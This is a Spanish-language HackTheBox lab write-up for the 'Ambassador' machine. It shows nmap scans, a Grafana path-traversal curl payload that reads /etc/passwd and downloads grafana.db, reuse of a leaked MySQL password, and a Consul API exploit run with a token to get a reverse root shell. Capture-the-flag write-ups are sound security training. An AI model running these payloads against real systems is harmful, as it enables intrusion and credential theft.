---
layout: single
title: Ambassador - HackTheBox
excerpt: " The hack the box ambassador is a medium-level Linux Web Exploitation machine that has a few CVEs. "
date: 2022-12-20
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-ambassador/ambassador.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:  
  - mysql
  - hashes
  - transversal
  - github
  - python
---

The hack the box ambassador is _a medium-level Linux Web Exploitation machine_ that has a few CVEs.

# Summary
- IP: 10.10.11.183
- Ports: 22,80,3000,3306
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
	-  80 -> Apache httpd 2.4.41
	-  3000 -> ppp?
	-  3306 -> MySQL 8.0.30-0ubuntu0.20.04.2

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

```bash
$sudo nmap -p22,80,3000,3306 -sCV 10.10.116.216 -oN targeted
``` 

- Búsqueda de directorios, pero no encontramos nada interesante; analizamos la web y tampoco hay nada relevante.
- Analizamos la web en el puerto 3000 y vemos un login de "Grafana", buscamos vulnerabilidades y encontramos una script en python la cual permite un LFI, analizamos el código y ejecutamos mediante un curl la parte que nos permite ejecutar el LFI:


```bash
$curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd | grep sh
```

- Confirmamos el LFI y hacemos una búsqueda básica de posibles vectores de ataque; intentamos descargar la base de datos que está por detrás de grafana usando el siguiente recurso:


```bash
$curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

- Abrimos el archivo ".db" con "sqlitebrowser" y analizamos la base de datos; vemos una tabla llamada "data-source", le hacemos un "table browse" y encontramos el usuario y contraseña para acceder a la base de datos de "grafana", lo hacemos:

```bash
$mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!
```

- Buscamos información relevante:

```bash
show databes;
use whackywidget;
show tables;
select * from users;
```

- Encontramos el usuario "developer" con un hash, lo crackeamos en www.hashes.com y accedemos por SSH como "developer", y encontramos la primera flag.

# ESCALANDO PRIVILEGIOS:


- Haciendo una búsqueda típica, no encontramos nada que pueda usarse para escalar privilegios, así que buscamos de forma más rigurosa.

- En el directorio "/opt" encontramos una posible aplicación desarrollada en git llamada "my-app", entramos y buscamos archivos ocultos.

- Vemos un ".git" por lo que confirmamos que se trata de un desarrollo para github, ejecutamos el comando siguiente para verificar el log:

```bash
git log
```

- Vemos varios commits, analizamos el primero con:

```bash
git show 33a53ef9a207976d5ceceddc41a199558843bf3c
```

- Podemos ver un código en el que se involucra la función "consul" y un token que podríamos aprovechar ya que con un "ls -l" podemos ver que todo este aplicativo está gestionado por root; buscamos exploits para aprovechar esta función consul y encontramos el siguiente: [GatoGamer1155/Hashicorp-Consul-RCE-via-API: Exploit of RCE for gain reverse shell (bash) in Hashicorp Consul on Remote Command Execution via API (github.com)](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)

- Descargamos el exploit, lo pasamos a la máquina víctima, y lo ejecutamos poniéndonos en escucha en la máquina atacante:

```bash
$ python3 exploit.py --lhost 10.10.14.30 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
```

- Accedemos a una shell como root y vemos la última flag.
